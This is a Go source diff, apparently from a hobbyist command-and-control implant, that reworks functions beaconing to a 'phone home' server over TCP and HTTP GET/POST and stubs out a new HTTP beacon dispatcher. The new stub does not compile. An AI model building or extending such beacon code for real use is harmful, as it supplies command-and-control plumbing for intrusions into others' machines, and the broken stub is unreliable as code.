@@ -27,13 +27,14 @@ import (
 // command_tcpaddr is an ip:port as string for TCP connections
 // if a "good password *HINT*" is provided
 // has a return code to process: 0 means an error, 1 means success
-func BaconTCP(command_tcpaddr string) (return_code int, derp error) {
-	// Have to cast the string to a net.IP type
-	Core.PHONEHOME_TCP.IP = net.IP(command_tcpaddr)
+func BaconTCP(command_tcpaddr net.TCPAddr) (return_code int, derp error) {
+	// OLD: Have to cast the string to a net.IP type
+	//Core.PHONEHOME_TCP.IP = net.IP(command_tcpaddr)
+
 	// the network functions return two objects
 	// a connection
 	// and an error
-	connection, derp := net.DialTCP("tcp", &Core.Local_tcpaddr_LAN, &Core.PHONEHOME_TCP)
+	connection, derp := net.DialTCP("tcp", &Core.Local_tcpaddr_LAN, &command_tcpaddr) // &Core.PHONEHOME_TCP)
 	if derp != nil {
 		// print the error
 		ErrorHandling.Error_printer(derp, "[-] Error: TCP Beacon handshake Failed")
@@ -83,6 +84,21 @@ func BeaconUDP() {
 // and will only be used as a beacon. the handshake is a specific
 // function that needs its own code and placement
 
+///////////////////////////////////////////////////////////////////////////////
+//                            HTTP STUFF
+///////////////////////////////////////////////////////////////////////////////
+/*/
+HTTP Methods of beaconing out
+	- GET
+	- POST
+	- maybe others
+/*/
+
+// function to call other functions
+func BeaconHTTP(command_http string) return_code int , derp error {
+	
+
+}
 func BeaconHTTPGet(command_url string) (*http.Response, error) {
 	http_response, derp := http.Get(command_url)
 	if derp != nil {
@@ -93,9 +109,6 @@ func BeaconHTTPGet(command_url string) (*http.Response, error) {
 }
 
 func BeaconHTTPPost(command_url string) (*http.Response, error) {
-	//  POST requests are pushing data to the server
-	// they POST data to a source, instead of GETting it!
-	// GET it?
 	post_body, derp := json.Marshal(Core.BEACONPOSTPAYLOAD)
 	if derp != nil {
 		ErrorHandling.Error_printer(derp, "[-] Beacon POST payload failed to marshal, stopping beacon")
@@ -112,6 +125,10 @@ func BeaconHTTPPost(command_url string) (*http.Response, error) {
 	}
 	return http_response, derp
 }
+
+/////////////////////////////////////////////////////////////////////////////
+//                         DNS STUFF
+/////////////////////////////////////////////////////////////////////////////
 
 /*/
 MDNS: https://en.wikipedia.org/wiki/Multicast_DNS
